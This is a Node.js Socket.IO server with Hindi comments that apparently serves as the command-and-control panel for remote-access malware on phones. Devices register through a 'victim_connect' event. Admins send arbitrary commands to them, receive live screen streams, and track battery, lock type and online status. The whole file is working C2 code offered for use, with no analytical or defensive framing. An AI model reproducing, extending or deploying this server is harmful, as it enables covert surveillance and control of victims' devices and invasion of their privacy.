const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    pingInterval: 25000,  // बढ़ाया
    pingTimeout: 10000,   // बढ़ाया
    transports: ['websocket'],
    cors: { origin: "*" },
    allowEIO3: true,
    connectionStateRecovery: {
        maxDisconnectionDuration: 2 * 60 * 1000, // 2 minutes
        skipMiddlewares: true
    }
});

const PORT = process.env.PORT || 8080;

let devices = {};
const adminSockets = new Map();  // Map में बदला

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// Connection quality मॉनिटरिंग
const connectionStats = new Map();

io.on('connection', (socket) => {
    console.log('✅ New connection:', socket.id);
    
    // Connection quality ट्रैक करें
    connectionStats.set(socket.id, {
        connectedAt: Date.now(),
        packetsReceived: 0,
        packetsSent: 0,
        disconnections: 0
    });

    socket.on('admin_join', () => {
        adminSockets.set(socket.id, {
            type: 'admin',
            connectedAt: Date.now(),
            lastPing: Date.now()
        });
        console.log('👑 Admin joined:', socket.id);
        socket.emit('device_list', Object.values(devices));
        
        // Auto ping
        const pingInterval = setInterval(() => {
            if (socket.connected) {
                socket.emit('ping', { time: Date.now() });
            }
        }, 15000);
        
        socket.on('pong', (data) => {
            const admin = adminSockets.get(socket.id);
            if (admin) {
                admin.lastPing = Date.now();
                admin.latency = Date.now() - data.time;
            }
        });
        
        socket.on('disconnect', () => {
            clearInterval(pingInterval);
        });
    });

    // डिवाइस से कमांड भेजने के लिए
    socket.on('command_to_device', (data) => {
        const device = devices[data.deviceId];
        if (device && device.socketId) {
            io.to(device.socketId).emit(data.action, data.payload);
            
            // Stats update
            const stats = connectionStats.get(socket.id);
            if (stats) stats.packetsSent++;
        }
    });

    // जब नया डिवाइस कनेक्ट हो
    socket.on('victim_connect', (deviceInfo) => {
        const existingDevice = devices[deviceInfo.deviceId];
        
        if (existingDevice) {
            // पहले से है तो सिर्फ socketId अपडेट करें
            existingDevice.socketId = socket.id;
            existingDevice.lastConnected = Date.now();
            existingDevice.disconnections = (existingDevice.disconnections || 0);
            devices[deviceInfo.deviceId] = existingDevice;
        } else {
            // नया डिवाइस
            devices[deviceInfo.deviceId] = {
                ...deviceInfo,
                socketId: socket.id,
                connectedAt: Date.now(),
                lastConnected: Date.now(),
                disconnections: 0
            };
        }
        
        console.log('📱 Device connected:', deviceInfo.deviceName, 'Socket:', socket.id);
        
        // Force connection stability
        socket.conn.on("packetCreate", (packet) => {
            if (packet.type === "ping") {
                const stats = connectionStats.get(socket.id);
                if (stats) stats.packetsSent++;
            }
        });
        
        // सभी एडमिन को नोटिफाई करें
        adminSockets.forEach((admin, adminId) => {
            if (io.sockets.sockets.get(adminId)?.connected) {
                io.to(adminId).emit('new_device_joined', devices[deviceInfo.deviceId]);
            }
        });
    });

    // डिवाइस से डेटा प्राप्त करें
    socket.on('screen_data', (data) => {
        adminSockets.forEach((admin, adminId) => {
            if (io.sockets.sockets.get(adminId)?.connected) {
                io.to(adminId).emit('screen_update', data);
            }
        });
    });
    
    socket.on('live_screen', (data) => {
        // Rate limiting - एक ही डिवाइस से बहुत ज्यादा डेटा न आने दें
        const device = devices[data.deviceId];
        if (device) {
            const now = Date.now();
            if (device.lastScreenData && (now - device.lastScreenData < 50)) {
                return; // 20 FPS से ज्यादा नहीं
            }
            device.lastScreenData = now;
        }
        
        adminSockets.forEach((admin, adminId) => {
            if (io.sockets.sockets.get(adminId)?.connected) {
                io.to(adminId).emit('live_screen', data);
            }
        });
    });

    // हार्टबीट
    socket.on('heartbeat', (data) => {
        if (data && data.deviceId && devices[data.deviceId]) {
            devices[data.deviceId].battery = data.battery;
            devices[data.deviceId].lockType = data.lockType || "none";
            devices[data.deviceId].lastSeen = Date.now();
            devices[data.deviceId].lastHeartbeat = Date.now();
            
            // सिर्फ active एडमिन को भेजें
            adminSockets.forEach((admin, adminId) => {
                const adminSocket = io.sockets.sockets.get(adminId);
                if (adminSocket?.connected) {
                    adminSocket.emit('device_heartbeat', {
                        ...data,
                        connectionQuality: connectionStats.get(socket.id) || {}
                    });
                }
            });
        }
    });

    // Connection health check
    socket.on('connection_health', (data) => {
        const stats = connectionStats.get(socket.id);
        if (stats) {
            stats.lastHealthCheck = Date.now();
            stats.healthData = data;
        }
    });

    // जब कोई डिस्कनेक्ट हो
    socket.on('disconnect', (reason) => {
        console.log('❌ Disconnected:', socket.id, 'Reason:', reason);
        
        const stats = connectionStats.get(socket.id);
        if (stats) {
            stats.disconnections++;
            stats.disconnectedAt = Date.now();
        }
        
        // एडमिन है तो
        if (adminSockets.has(socket.id)) {
            adminSockets.delete(socket.id);
            console.log('👑 Admin disconnected:', socket.id);
        } 
        // डिवाइस है तो
        else {
            let disconnectedDeviceId = null;
            for (const deviceId in devices) {
                if (devices[deviceId].socketId === socket.id) {
                    disconnectedDeviceId = deviceId;
                    devices[deviceId].lastDisconnected = Date.now();
                    devices[deviceId].disconnections = (devices[deviceId].disconnections || 0) + 1;
                    devices[deviceId].socketId = null; // सिर्फ socketId null करें, डिवाइस को डिलीट न करें
                    break;
                }
            }
            
            if (disconnectedDeviceId) {
                console.log('📱 Device socket disconnected:', disconnectedDeviceId);
                
                // एडमिन को बताएं कि डिवाइस ऑफलाइन है
                adminSockets.forEach((admin, adminId) => {
                    const adminSocket = io.sockets.sockets.get(adminId);
                    if (adminSocket?.connected) {
                        adminSocket.emit('device_offline', {
                            deviceId: disconnectedDeviceId,
                            lastSeen: Date.now()
                        });
                    }
                });
            }
        }
        
        // Cleanup after delay
        setTimeout(() => {
            connectionStats.delete(socket.id);
        }, 60000);
    });
});

// Periodic cleanup
setInterval(() => {
    const now = Date.now();
    for (const deviceId in devices) {
        const device = devices[deviceId];
        // अगर डिवाइस 5 मिनट से ज्यादा से ऑफलाइन है तो हटा दें
        if (device.lastSeen && (now - device.lastSeen > 5 * 60 * 1000)) {
            console.log('🧹 Cleaning up old device:', deviceId);
            delete devices[deviceId];
        }
    }
}, 60000);

server.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📊 Max listeners: ${server.maxListeners}`);
});
